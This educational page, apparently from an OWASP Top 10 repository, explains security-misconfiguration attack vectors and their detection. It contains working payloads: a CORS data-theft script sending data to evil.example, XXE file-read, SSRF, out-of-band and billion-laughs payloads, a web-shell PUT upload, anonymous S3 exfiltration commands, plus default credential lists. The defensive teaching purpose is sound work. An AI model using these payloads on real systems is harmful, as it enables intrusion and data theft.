# A5:2021 - Security Misconfiguration: Attack Vectors

> **⚠️ Educational purpose only.** These techniques are described so that defenders can recognise, reproduce in an authorised lab, and fix them. Only test systems you own or are explicitly permitted to assess.

## Table of Contents

- [The Core Attack Flow](#the-core-attack-flow)
- [1. Fingerprinting via Banners and Headers](#1-fingerprinting-via-banners-and-headers)
- [2. Default and Sample Credentials](#2-default-and-sample-credentials)
- [3. Verbose Errors and Stack Traces](#3-verbose-errors-and-stack-traces)
- [4. Debug Mode / Interactive Console (RCE)](#4-debug-mode--interactive-console-rce)
- [5. Directory Listing and Exposed Artifacts](#5-directory-listing-and-exposed-artifacts)
- [6. Exposed Admin, Sample, and Management Apps](#6-exposed-admin-sample-and-management-apps)
- [7. Missing Security Headers](#7-missing-security-headers)
- [8. Overly Permissive CORS](#8-overly-permissive-cors)
- [9. Dangerous HTTP Methods](#9-dangerous-http-methods)
- [10. XML External Entities (XXE)](#10-xml-external-entities-xxe)
- [11. Public Cloud Storage and Broad IAM](#11-public-cloud-storage-and-broad-iam)
- [12. Unpatched and Outdated Components](#12-unpatched-and-outdated-components)
- [13. Insecure Cookie and Session Flags](#13-insecure-cookie-and-session-flags)
- [14. Exposed Version Control and Config Files](#14-exposed-version-control-and-config-files)
- [Chaining It Together](#chaining-it-together)

## The Core Attack Flow

Misconfiguration is usually exploited through a low-effort, high-signal loop. There is rarely a bespoke exploit—the attacker enumerates the target until an insecure default answers back.

```
  ENUMERATE            PROBE                 EXPLOIT              EXPAND
  Fingerprint    ->    Trigger errors,  ->   Log in with     ->  Read files,
  stack, guess         request known         defaults, hit        pivot to
  paths, scan          config paths,         debug console,       internal
  ports/subdomains     read headers          open bucket          services

     |                     |                     |                   |
     +----- automated by scanners (nuclei, nikto, feroxbuster, Shodan) -----+
```

The key insight for defenders: every step above is *noisy and detectable*, and every step is defeated by hardening a default. The attacker's advantage is entirely that the configuration was never reviewed.

## 1. Fingerprinting via Banners and Headers

Before attacking anything, the adversary identifies the exact stack so they can match it to known exploits. Misconfigured servers volunteer this for free.

```
$ curl -sI https://target.example.com/

HTTP/1.1 200 OK
Server: Apache/2.4.29 (Ubuntu)          <-- exact server + OS
X-Powered-By: PHP/7.2.10                 <-- exact language version
X-AspNet-Version: 4.0.30319              <-- framework version
Set-Cookie: PHPSESSID=...; path=/        <-- tech stack confirmed
```

**Impact**: An outdated `Server` banner is a shopping list—the attacker looks up CVEs affecting that exact version. Every disclosed version narrows the search from "the whole internet's exploits" to "the three that work here."

## 2. Default and Sample Credentials

Countless products ship with a documented default login. If the operator never changed it, authentication is a formality.

```
admin / admin        root / root          guest / guest
admin / password     tomcat / tomcat      elastic / changeme
sa / (blank)         postgres / postgres  user / user
```

These are tried against login pages, database ports, admin panels (`/manager/html` on Tomcat, router UIs, CMS admins) and API tokens. Because the credential is public documentation, the "exploit" is a single request.

## 3. Verbose Errors and Stack Traces

Applications configured to display detailed errors leak their internals whenever an attacker triggers an exception (bad input, a wrong type, a missing parameter).

```
GET /product?id=abc'  -- unexpected input triggers a DB error

HTTP/1.1 500 Internal Server Error

Fatal error: Uncaught PDOException: SQLSTATE[42000]:
  syntax error near ''abc''' in /var/www/html/app/models/Product.php:57
Stack trace:
  #0 /var/www/html/app/controllers/Shop.php(112)
  DB DSN: mysql:host=db.internal;dbname=shop_prod;user=shop
```

**Impact**: Reveals absolute file paths (useful for LFI/RFI and log poisoning), the database engine and schema, internal hostnames, and confirms an injection point—all from one malformed request.

## 4. Debug Mode / Interactive Console (RCE)

Some frameworks pair verbose errors with an *interactive debugger*. If left enabled in production, the error page itself executes attacker code.

```
# Flask/Werkzeug with debug=True in production
GET /trigger-error HTTP/1.1

HTTP/1.1 500 INTERNAL SERVER ERROR
# Renders the Werkzeug debugger. Any traceback frame offers a
# console prompt that evaluates Python on the server:
>>> __import__('os').popen('id').read()
'uid=33(www-data) gid=33(www-data)'
```

**Impact**: Direct remote code execution as the web user—the single most severe outcome in this category. Django (`DEBUG=True`), Rails, Spring Boot devtools, and PHP with `display_errors` have their own equivalents of over-exposed debugging surface.

## 5. Directory Listing and Exposed Artifacts

When automatic directory indexing is on and no index file exists, the server returns a browsable listing. Attackers walk these to harvest files that were never meant to be public.

```
GET /backup/ HTTP/1.1

<title>Index of /backup</title>
  db_dump_2026-01.sql       14M
  app.tar.gz                88M
  .env.bak                  1K
  users_export.csv          2M
```

**Impact**: Source code, database dumps, credentials, and PII downloaded directly—no authentication, no exploit. Attackers also brute-force common names (`feroxbuster`, `dirb`) to find directories not linked anywhere.

## 6. Exposed Admin, Sample, and Management Apps

Default installs and forgotten components leave management surfaces reachable:

```
/phpmyadmin/         /adminer.php        /manager/html   (Tomcat)
/server-status       /server-info        /.well-known/   (recon)
/wp-admin/           /solr/#/            /actuator/env   (Spring secrets)
/console             /jenkins/script     /kibana/
```

**Impact**: Database administration UIs, application servers, CI consoles, and monitoring dashboards frequently allow configuration changes, script execution, or credential disclosure—often with weak or default auth on top.

## 7. Missing Security Headers

The absence of protective headers does not "leak" data directly, but it removes the browser-side guardrails that make other attacks hard:

| Missing Header | Attack it Enables |
|----------------|-------------------|
| No `Content-Security-Policy` | Injected/reflected scripts run unrestricted (XSS) |
| No `Strict-Transport-Security` | SSL-strip: force victim onto plain HTTP and intercept |
| No `X-Frame-Options`/`frame-ancestors` | Clickjacking: overlay the app in a hidden iframe |
| No `X-Content-Type-Options: nosniff` | Browser mis-executes an upload as script |

Attackers check for these first because their absence tells them which follow-on attacks will succeed.

## 8. Overly Permissive CORS

Cross-Origin Resource Sharing controls which origins may read authenticated responses. A server that reflects the request's `Origin` and allows credentials lets any malicious site read a logged-in victim's data.

```
# Attacker probes with an arbitrary Origin:
GET /api/account HTTP/1.1
Origin: https://evil.example

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.example   <-- reflected!
Access-Control-Allow-Credentials: true              <-- fatal combo
```

```javascript
// Hosted on evil.example; runs in the victim's browser:
fetch('https://target.example/api/account', { credentials: 'include' })
  .then(r => r.text())
  .then(data => navigator.sendBeacon('https://evil.example/steal', data));
```

**Impact**: Silent cross-origin theft of account data, tokens, and anything the victim's session can read. (Browsers forbid the literal `*` with credentials, so vulnerable servers reflect the origin instead—equally dangerous.)

## 9. Dangerous HTTP Methods

Servers that enable methods beyond what routes need expand the attack surface:

```
$ curl -sX OPTIONS https://target.example/ -i | grep Allow
Allow: GET, POST, PUT, DELETE, TRACE, PATCH

# TRACE can enable Cross-Site Tracing (echoes headers/cookies)
# PUT may allow uploading a web shell if WebDAV is misconfigured
$ curl -X PUT https://target.example/shell.php --data-binary @shell.php
```

**Impact**: Unrestricted `PUT`/`DELETE` can write or remove files; `TRACE` assists cookie theft; enabled but unused verbs are pure attack surface.

## 10. XML External Entities (XXE)

Merged into this category in 2021, XXE is exploitation of an XML parser *configured* to resolve external entities. Any feature that accepts XML is a candidate: SOAP endpoints, SAML, RSS import, SVG upload, and Office documents (DOCX/XLSX are ZIP-packaged XML).

**File disclosure**

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
<!-- Response echoes the file contents back to the attacker -->
```

**SSRF to cloud metadata**

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<!-- Parser fetches internal URL; can steal cloud IAM credentials -->
```

**Blind / out-of-band exfiltration**

```xml
<!DOCTYPE r [
  <!ENTITY % ext SYSTEM "http://evil.example/evil.dtd">
  %ext;
]>
<!-- evil.dtd builds an entity that POSTs file contents to the attacker -->
```

**Denial of service ("billion laughs")**

```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
<!-- Exponential entity expansion exhausts memory -->
```

**Impact**: Local file read, SSRF against internal services and cloud metadata, out-of-band data exfiltration, and denial of service—all from a parser that should have had DTDs disabled.

## 11. Public Cloud Storage and Broad IAM

Cloud object storage and identity policies are configuration, and permissive settings are directly enumerable:

```
# Guess/enumerate bucket names, then list and download:
$ curl https://target-backups.s3.amazonaws.com/          # lists keys if public
$ aws s3 ls s3://target-backups --no-sign-request          # anonymous access
$ aws s3 cp s3://target-backups/db.sql . --no-sign-request # exfiltrate
```

**Impact**: Public read exposes backups and PII; public write allows tampering (serving malware from a trusted domain). Overly broad IAM roles let a foothold escalate to account takeover.

## 12. Unpatched and Outdated Components

Once the stack is fingerprinted (vector 1), the attacker matches versions to public exploits. Leaving old, unpatched components running is a configuration and maintenance failure:

```
# Version banner said Apache Struts 2.x / old CMS plugin / old library
$ searchsploit <product> <version>
$ nuclei -u https://target.example -t cves/    # templated CVE checks
```

**Impact**: Public proof-of-concept exploits turn a known CVE into working RCE or auth bypass with almost no attacker skill required.

## 13. Insecure Cookie and Session Flags

Session cookies configured without protective flags are exposed to theft and misuse:

```
Set-Cookie: session=abc123
# Missing: Secure   -> sent over HTTP, sniffable
# Missing: HttpOnly -> readable by injected JavaScript (XSS -> theft)
# Missing: SameSite -> sent cross-site, enabling CSRF
```

**Impact**: Session hijacking via network sniffing or XSS, and cross-site request forgery—each a default flag away from being prevented.

## 14. Exposed Version Control and Config Files

Deploying by copying a working tree, or serving the app root as static files, exposes metadata directories and secrets:

```
GET /.git/config           -> remote URLs; whole repo often reconstructable
GET /.env                  -> DB passwords, API keys, JWT secrets
GET /config.php.bak        -> editor backup with live credentials
GET /wp-config.php~        -> CMS DB credentials
GET /.svn/entries          -> source metadata
```

**Impact**: With `.git` exposed, tools reconstruct the entire source tree (and its history of removed secrets). A single leaked `.env` is often full compromise.

## Chaining It Together

Real intrusions combine these low-severity defaults into a high-severity outcome. A representative chain:

1. **Fingerprint** (vector 1): banner reveals an old framework in debug builds.
2. **Trigger an error** (vector 3): verbose stack trace leaks the absolute app path and confirms debug mode is on.
3. **Hit the debugger** (vector 4): the interactive console executes code as `www-data`.
4. **Read config** (vector 14): the console reads `.env`, yielding cloud IAM keys.
5. **Pivot to cloud** (vector 11): the keys list and download every storage bucket.

Each individual step was "just a default." The lesson for the Prevention page: because these chain, you must close *all* of them, and you must close them *repeatably* so they do not silently reappear on the next deploy.

## Detection Signals for Defenders

- Spikes of 404/500 responses and requests for `/.git/`, `/.env`, `/backup/`, `/phpmyadmin/` in access logs.
- `OPTIONS` requests and unusual verbs (`TRACE`, `PUT`) from a single source.
- Requests carrying suspicious `Origin` headers, or XML bodies containing `<!DOCTYPE` / `<!ENTITY`.
- Anonymous access attempts against cloud storage and management ports.

## Next Steps

- **[Overview](./overview.md)**: Understand the category and where misconfiguration hides
- **[Prevention](./prevention.md)**: Layered defenses and a hardened baseline that closes every vector above
- **[Examples](./examples.md)**: Vulnerable vs. secure configuration you can copy
- **[Hands-On Lab](./lab/debug-mode-lab/)**: Exploit and then fix a debug-mode misconfiguration safely

---

*Part of the [OWASP Top 10 Educational Repository](../../README.md)*
